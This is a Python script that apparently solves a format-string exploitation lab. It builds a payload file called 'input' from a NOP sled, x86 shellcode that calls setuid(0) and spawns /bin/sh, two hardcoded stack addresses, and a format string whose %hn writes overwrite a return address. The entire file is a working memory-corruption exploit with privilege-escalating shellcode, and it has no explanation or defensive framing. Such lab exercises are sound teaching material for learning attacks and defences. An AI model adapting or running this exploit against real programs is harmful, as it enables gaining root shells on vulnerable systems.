#!/usr/bin/python3
import sys

# This shellcode creates a local shell
local_shellcode= (
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')


N = 200
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the code at the end
start = N - len(local_shellcode)
content[start:] = local_shellcode


# Put the address at the beginning
addr1 = 0xbfffefae
addr2 = 0xbfffefac
content[0:4]  =  (addr1).to_bytes(4,byteorder='little')
content[4:8]  =  ("@@@@").encode('latin-1')
content[8:12]  = (addr2).to_bytes(4,byteorder='little')

# Calculate the value of C
C = 15

# For investigation purpose (trial and error)

#s = "%.8x_"*C + "%n"  + "\n"

# Construct the format string
small = 0xbfff - 12 - C*8
large = 0xf024 - 0xbfff
s = "%.8x"*C + "%." + str(small) + "x" + "%hn" + "%." + str(large) + "x" + "%hn" 
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
file = open("input", "wb")
file.write(content)
file.close()

